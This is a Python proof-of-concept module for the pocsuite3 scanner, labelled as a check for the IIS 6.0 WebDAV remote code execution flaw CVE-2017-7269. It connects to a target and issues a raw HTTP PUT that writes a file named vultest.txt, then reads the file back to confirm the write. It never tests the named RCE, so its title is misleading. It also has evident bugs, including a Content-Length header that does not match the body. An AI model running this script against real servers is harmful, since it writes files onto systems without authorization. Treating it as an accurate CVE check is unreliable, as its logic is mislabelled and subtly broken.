#!/usr/bin/env python
#_*_ encoding: utf-8 _*_

from pocsuite3.api import POCBase
from pocsuite3.api import Output
from pocsuite3.api import register_poc
from pocsuite3.api import requests
from collections import OrderedDict
from pocsuite3.api import OptString, logger
import socket

class IISWebDav(POCBase):
    vulID = '92834'
    version = '1.0'
    author = ['big04dream']
    vulDate = '2017-03-28'
    createDate = '2019-10-17'
    updateDate = '2019-10-17'
    references = ['https://www.seebug.org/vuldb/ssvid-92834']
    name = 'IIS 6.0 WebDav Remote Code Execution (CVE-2017-7269)'
    appPowerLink = 'https://www.iis.net/'
    appName = 'IIS 6.0'
    appVersion = '6.0'
    vulType = 'rce'
    desc = '''
    IIS 6.0 WebDav Remote Code Execution (CVE-2017-7269)
    '''

    def _options(self):
        o = OrderedDict()
        o['port'] = OptString('', description='这个poc需要输入端口号', require=True)
        return o

    def _verify(self):
        result = {}
        try:
            socket.setdefaulttimeout(10)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ip = self.url.split('//')[1]
            port = int(self.get_option('port'))
            s.connect((ip, port))
            flag = "PUT /vultest.txt HTTP/1.1\r\nHost: %s:%d\r\nContent-Length: 9\r\n\r\nbig04dream\r\n\r\n" % (ip, port)
            s.send(flag.encode())
            data = s.recv(1024)
            s.close()
            if b'PUT' in data:
                url = 'http://' + ip + ":" + str(port) + '/vultest.txt'
                res_html = requests.get(url, timeout=5).text
                if 'big04dream' in res_html:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url
                    result['VerifyInfo']['Payload'] = flag
        except Exception as e:
            logger.info(e)
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not webdav vulnerability')
        return output

register_poc(IISWebDav)